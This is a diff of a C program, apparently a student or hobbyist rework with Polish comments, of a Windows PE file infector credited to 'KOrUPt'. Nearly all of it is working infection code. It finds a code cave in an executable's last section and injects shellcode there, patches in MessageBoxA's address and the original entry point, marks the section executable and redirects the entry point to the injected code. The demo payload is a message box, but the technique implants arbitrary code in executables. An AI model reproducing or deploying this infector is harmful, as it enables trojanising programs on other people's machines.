@@ -1,11 +1,7 @@
-// PE Infecter by KOrUPt @ http://KOrUPt.co.uk
-// fixed for mingw by sekio
 #include <windows.h>
 #include <stdio.h>
 #include <winnt.h>
-
-
-
+#include <stdlib.h>
 
 extern DWORD get_size();
 
@@ -16,7 +12,7 @@ PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
 }
 
 /*
-* returns the PE header
+ Zwraca Header PE
 */
 PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
 	PIMAGE_DOS_HEADER pidh = GetDosHeader(file);
@@ -25,7 +21,7 @@ PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
 }
 
 /*
-* returns the file header
+ Zwraca Header pliku
 */
 PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
 	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
@@ -34,7 +30,7 @@ PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
 }
 
 /*
-* returns the optional header
+* Zwraca optional Header
 */
 PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
 	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
@@ -43,8 +39,7 @@ PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
 }
 
 /*
-* returns the first section's header
-* AKA .text or the code section
+ Zwraca pierwsza sekcje pliku PE (sekcje .code lub .text)
 */
 PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
 	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
@@ -52,6 +47,9 @@ PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
 	return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
 }
 
+/*
+ Zwraca ostatnia sekcje pliku PE
+*/
 PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
 	return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)->FileHeader.NumberOfSections - 1));
 }
@@ -67,109 +65,114 @@ BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
 
 int main(int argc, char* argv[])
 {
-	DWORD* start;
-	HANDLE hFile = CreateFile(L"pefile.exe", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == INVALID_HANDLE_VALUE)
+	HANDLE hPlik = CreateFile(L"pefile.exe", FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //Wczytanie pliku .exe
+	if (hPlik == INVALID_HANDLE_VALUE)
 	{
-		printf("[-] Cannot open %s\n", "pefile.exe");
+		printf("[-] Nie udalo sie otworzyc %s\n", "pefile.exe");
 		return 0;
 	}
-	DWORD dwFileSize = GetFileSize(hFile, NULL);
-	HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
-	LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);
 
-	// check if valid pe file
+	//Sprawdzenie wielkosci pliku PE
+	DWORD rozmiar_pliku = GetFileSize(hPlik, NULL); 
+	//Mapowanie pliku do pamieci programu w celu operacji na nim
+	HANDLE hMapping = CreateFileMapping(hPlik, NULL, PAGE_READWRITE, 0, rozmiar_pliku, NULL);
+	LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, rozmiar_pliku);
+
+	//Czy plik jest poprawny
 	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
 		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
 		fprintf(stderr, "Not a valid PE file\n");
 		return 1;
 	}
 
+	//Odczytanie informacji o naglowkach pliku 
 	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
 	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);
 
-	// get original entry point
+	//Ustalenie adresu od ktorego rozpocznie sie wykonywanie pliku PE
 	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
 		pinh->OptionalHeader.ImageBase;
 
-	DWORD dwShellcodeSize = get_size();// -start;// -start;
+	//Za pomoca funkcji z assemblera obliczenie wielkosci kodu, ktory chcemy dokleic do plku
+	DWORD rozmiar_kodu = get_size(); 
 
-	// find code cave
-	DWORD dwCount = 0;
-	DWORD dwPosition = 0;
-
-	for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
-		if (*(lpFile + dwPosition) == 0x00) {
-			if (dwCount++ == dwShellcodeSize) {
-				// backtrack to the beginning of the code cave
-				dwPosition -= dwShellcodeSize;
+	DWORD licznik = 0, pozycja = 0;
+	//szukanie wolnego miejsca na umieszczenie naszego kodu
+	for (pozycja = pish->PointerToRawData; pozycja < rozmiar_pliku; pozycja++) {
+		if (*(lpFile + pozycja) == 0x00) { //jesli znalezlismy puste miejsce(czyli 0x00), zliczamy je
+			if (licznik++ == rozmiar_kodu) { //zwieksz licznik, jesli ilosc pustych miejsc jest rowna wielkosci naszego kodu
+				pozycja -= rozmiar_kodu; //zapamietujemy miejsce w ktorym wsadzimy nasz kod
 				break;
 			}
 		}
 		else {
-			// reset counter if failed to find large enough cave
-			dwCount = 0;
+			licznik = 0; //jesli blok wolnego miejsca jest za maly to resetujemy licznik
 		}
 	}
 
-	// if failed to find suitable code cave
-	if (dwCount == 0 || dwPosition == 0) {
+	//jesli nie udalo sie znalesc miejsca na nasz kod
+	if (licznik == 0 || pozycja == 0) {
+		printf("Nie znaleziono odpowiedniego miejsca na kod");
 		return 1;
 	}
 
-	// dynamically obtain address of function
+	//dynamiczne pozyskanie biblioteki
 	HMODULE hModule = LoadLibrary(L"User32.dll");
+	//Pozyskanie adresu funkcji MessageBoxA z User32.dll
+	LPVOID AdresMessageBoxA = (DWORD)GetProcAddress(hModule, "MessageBoxA");
 
-	LPVOID lpAddress = (DWORD)GetProcAddress(hModule, "MessageBoxA");
+	//stworzenie sterty w celu przechowania kodu w pamieci
+	HANDLE hSterta = HeapCreate(0, 0, rozmiar_kodu);
+	//zarezerowanie pamieci dla sterty
+	LPVOID buffor_z_kodem = HeapAlloc(hSterta, HEAP_ZERO_MEMORY, rozmiar_kodu);
 
-	// create buffer for shellcod
-	HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);
+	//wczytanie do pamieci naszego kodu funkcja get_adr, ktora zwraca adres poczatku naszego kodu
+	memcpy(buffor_z_kodem, get_adr(), rozmiar_kodu);
 
-	LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);
 
-	// move shellcode to buffer to modify
-	memcpy(lpHeap, get_adr(), dwShellcodeSize);
-
-	// modify function address offset
-	DWORD dwIncrementor = 0;
-	BYTE byte = 1;
-	while (dwIncrementor < dwShellcodeSize)
+	//wykrycie markerow w kodzie i wstawienie w ich miejsce adresu funkcji MessageBoxA
+	licznik = 0;
+	DWORD adres_markera, tmp;
+	while (licznik < rozmiar_kodu)
 	{
-		if (*((LPBYTE)lpHeap + dwIncrementor) == 0xAA) {
-			// insert function's address
-			DWORD ph_offset = ((LPBYTE)lpHeap + dwIncrementor);
-			DWORD tmp = lpAddress;
-			memcpy(ph_offset, &tmp, 4);
-			//*((LPDWORD)lpHeap + dwIncrementor) = 0xFFFFFFFF;//(DWORD)lpAddress;
+		if (*((LPBYTE)buffor_z_kodem + licznik) == 0xAA) { //marker znaleziony
+			//wstawienie w miejsce markera adresu MessageBoxA
+			adres_markera = ((LPBYTE)buffor_z_kodem + licznik); 
+			memcpy(adres_markera, &AdresMessageBoxA, 4); 
 			FreeLibrary(hModule);
 			break;
 		}
-		dwIncrementor++;
+		licznik++;
 	}
-	// modify OEP address offset
-	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {//nie wchodzi do fora
-		if (*((LPBYTE)lpHeap + dwIncrementor) == 0xAA) {
-			// insert OEP
-			DWORD ph_offset = ((LPBYTE)lpHeap + dwIncrementor);
-			DWORD tmp = dwOEP;
-			memcpy(ph_offset, &tmp, 4);
-			//*((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
+
+	//Dodanie adresu poczatkowego pliku PE, aby po wykonaniu naszego kodu wykonala sie pierwotna czesc pliku
+	licznik = 0;
+	while (licznik < rozmiar_kodu)
+	{
+		if (*((LPBYTE)buffor_z_kodem + licznik) == 0xAA) {
+			//wstawienie w miejsce markera adresu Original Entry Point tj. adresu poczatkowego pliku PE
+			adres_markera = ((LPBYTE)buffor_z_kodem + licznik);
+			memcpy(adres_markera, &dwOEP, 4);
 			break;
 		}
+		licznik++;
 	}
 
-	// copy the shellcode into code cave
-	memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
-	HeapFree(hHeap, 0, lpHeap);
-	HeapDestroy(hHeap);
+	//Skopiowanie kodu ze sterty do pliku
+	memcpy((LPBYTE)(lpFile + pozycja), buffor_z_kodem, rozmiar_kodu);
+	HeapFree(hSterta, 0, buffor_z_kodem);
+	HeapDestroy(hSterta);
 
-	// update PE file information
-	pish->Misc.VirtualSize += dwShellcodeSize;
-	// make section executable
+	//Aktualizacja rozmiaru pliku PE
+	pish->Misc.VirtualSize += rozmiar_kodu;
+
+	//Zrobienie sekcji mozliwa do uruchomienia (executable)
 	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
-	// set entry point
+
+	//Ustawienie nowego adresu rozpoczecia pliku (Address of Entry Point)
 	// RVA = file offset + virtual offset - raw offset
-	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
-	//cout << "File modfied";
+	pinh->OptionalHeader.AddressOfEntryPoint = pozycja + pish->VirtualAddress - pish->PointerToRawData;
+	printf("Plik poprawnie zmodyfikowany");
 	return 0;
 }
